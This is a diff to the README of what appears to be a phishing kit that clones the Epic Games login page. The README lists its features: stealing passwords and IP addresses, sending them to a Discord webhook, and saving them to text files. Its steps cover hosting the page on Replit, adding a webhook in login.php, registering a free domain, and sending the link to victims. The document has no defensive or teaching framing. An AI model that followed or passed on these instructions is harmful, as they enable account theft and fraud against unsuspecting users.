@@ -15,7 +15,6 @@ Epic Games Phishing Page working with Discord webhook or save it on a .txt file.
 - Steal Epic Games Account Password
 - Send All Infos Through Discord Webhook
 - Save Infos On A .txt file
-- Your Webhook Is protected [(thx Rdimo)]()
 - Steal User's Ip
 - Copy of the official Epic Game Login Page
 
@@ -24,6 +23,9 @@ Epic Games Phishing Page working with Discord webhook or save it on a .txt file.
 2. Upload it on a host like Replit, Glitch, Vercel (Im using Replit)
 4. Go in `login.php`, and put your webhook url. (You can enable ping too)
 5. Then Your program is ready !
-(if you want to setup a free domain to your website, i recommend to use [Freenom](https://www.freenom.com))
+(if you want to setup a free domain to your website, i recommend to use [Freenom](https://www.freenom.com). You can setup your domain by following a youtube tutorial its ezy dont worry)
 
-# ❓ - How to Use ?
+# ❓ - How do its work ?
+Copy the link and send it to someone idk 🤷‍♂️.
+Then when the user loggin, you are going to recive the webhook embed with all infos [Exemple here]()
+There is 2 files with the infos that are going to be created in case your webhook get deleted or if you server got deleted, again, idk 🤷‍♂️.
